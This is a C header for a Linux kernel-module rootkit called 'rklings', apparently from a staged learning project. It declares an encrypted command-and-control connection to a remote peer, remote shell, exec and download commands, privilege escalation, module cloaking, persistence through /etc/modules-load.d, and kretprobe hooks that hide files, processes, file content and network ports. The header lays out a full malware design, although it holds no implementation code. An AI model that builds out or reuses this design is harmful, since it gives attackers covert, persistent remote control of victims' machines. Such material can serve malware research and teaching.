/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <crypto/aead.h>
#include <linux/kprobes.h>
#include <linux/mutex.h>
#include <linux/net.h>
#include <linux/spinlock.h>
#include <linux/types.h>
#include <linux/workqueue.h>

/* ---- Crypto constants ---- */

#define RK_KEY_LEN		32
#define RK_KEY_HEX_LEN		64
#define RK_NONCE_LEN		12
#define RK_TAG_LEN		16
#define RK_HDR_LEN		18

#define RK_DIR_CLIENT		1
#define RK_DIR_SERVER		2

/* ---- Protocol constants ---- */

#define RK_FRAME_MAX		4096
#define RK_CMD_MAX		256
#define RK_ARG_MAX		128
#define RK_CHUNK_SIZE		4096

/* ---- Target list constants ---- */

#define RK_TARGET_MAX		32
#define RK_NAME_MAX		64

/* ---- Persistence ---- */

#define PERSIST_PATH		"/etc/modules-load.d/rklings.conf"
#define MODULE_NAME_STR		"rklings"

/* ---- Envelope header (matches M03) ---- */

struct rk_envelope_hdr {
	u8 version;
	u8 direction;
	__be64 session_id;
	__be64 sequence;
} __packed;

/* ---- Encrypted session ---- */

struct rk_session {
	struct crypto_aead	*tfm;
	struct socket		*sock;
	u64			session_id;
	u64			tx_seq;
	u64			rx_seq_expected;
};

/* ---- Target list (from M01) ---- */

struct rk_target_list {
	spinlock_t	lock;
	char		targets[RK_TARGET_MAX][RK_NAME_MAX];
	int		count;
};

/* ---- Dispatch handler type ---- */

typedef int (*rk_handler_t)(struct rk_session *, const char *);

/* ---- Module parameters (core/init.c) ---- */

extern u8 rk_key[RK_KEY_LEN];
extern unsigned short peer_port;
extern char peer_addr_str[16];
extern unsigned int retry_base_ms;
extern unsigned int retry_max_ms;
extern unsigned int shell_timeout_ms;

/* ---- Target list instances (core/target.c) ---- */

extern struct rk_target_list rk_file_targets;
extern struct rk_target_list rk_pid_targets;
extern struct rk_target_list rk_content_targets;
extern struct rk_target_list rk_port_targets;

/* ---- core/target.c ---- */

void rk_target_init(struct rk_target_list *list);
int  rk_target_add(struct rk_target_list *list, const char *name);
int  rk_target_remove(struct rk_target_list *list, int idx);
bool rk_target_match(struct rk_target_list *list, const char *name);
bool rk_line_matches(struct rk_target_list *list, const char *line, int len);

/* ---- core/opsec.c ---- */

int  rk_escalate(void);
void rk_cloak(void);
void rk_uncloak(void);
int  rk_persist(void);
int  rk_unpersist(void);
void rk_auto_hide(struct socket *sock);
void rk_auto_unhide(void);

/* ---- core/filter.c (kretprobes) ---- */

extern struct kretprobe rk_getdents_probe;
extern struct kretprobe rk_read_probe;
extern struct kretprobe rk_tcp4_probe;
extern struct kretprobe rk_tcp6_probe;
extern struct kretprobe rk_mkdir_probe;
extern struct kretprobe rk_mkdirat_probe;

/* ---- network/protocol.c ---- */

struct socket *rk_connect(void);
int rk_send_frame(struct socket *sock, const void *buf, size_t len);
int rk_recv_frame(struct socket *sock, void *buf, size_t max_len,
		  size_t *out_len);

/* ---- crypto/envelope.c ---- */

int rk_send_sealed(struct rk_session *s, const u8 *data, size_t len);
int rk_recv_sealed(struct rk_session *s, u8 *out, size_t max_len,
		   size_t *out_len);

/* ---- network/agent.c ---- */

int rk_agent_thread(void *data);

/* ---- execution/dispatch.c ---- */

int rk_dispatch(struct rk_session *s, const u8 *buf, size_t len);
int rk_send_response(struct rk_session *s, const char *resp);

/* ---- execution/commands.c ---- */

int cmd_ping(struct rk_session *s, const char *arg);
int cmd_status(struct rk_session *s, const char *arg);
int cmd_info(struct rk_session *s, const char *arg);
int cmd_shell(struct rk_session *s, const char *arg);
int cmd_exec(struct rk_session *s, const char *arg);
int cmd_download(struct rk_session *s, const char *arg);
int cmd_hide_file(struct rk_session *s, const char *arg);
int cmd_unhide_file(struct rk_session *s, const char *arg);
int cmd_hide_pid(struct rk_session *s, const char *arg);
int cmd_unhide_pid(struct rk_session *s, const char *arg);
int cmd_hide_content(struct rk_session *s, const char *arg);
int cmd_unhide_content(struct rk_session *s, const char *arg);
int cmd_hide_port(struct rk_session *s, const char *arg);
int cmd_unhide_port(struct rk_session *s, const char *arg);
int cmd_list(struct rk_session *s, const char *arg);
int cmd_persist(struct rk_session *s, const char *arg);
int cmd_unpersist(struct rk_session *s, const char *arg);
int cmd_escalate(struct rk_session *s, const char *arg);
int cmd_cloak(struct rk_session *s, const char *arg);
int cmd_uncloak(struct rk_session *s, const char *arg);

/* ---- execution/shell.c ---- */

void rk_shells_init(void);
void rk_shells_cleanup(void);
int  rk_start_interactive(void);
int  rk_start_exec(const char *cmd);

#endif /* ROOTKIT_H */
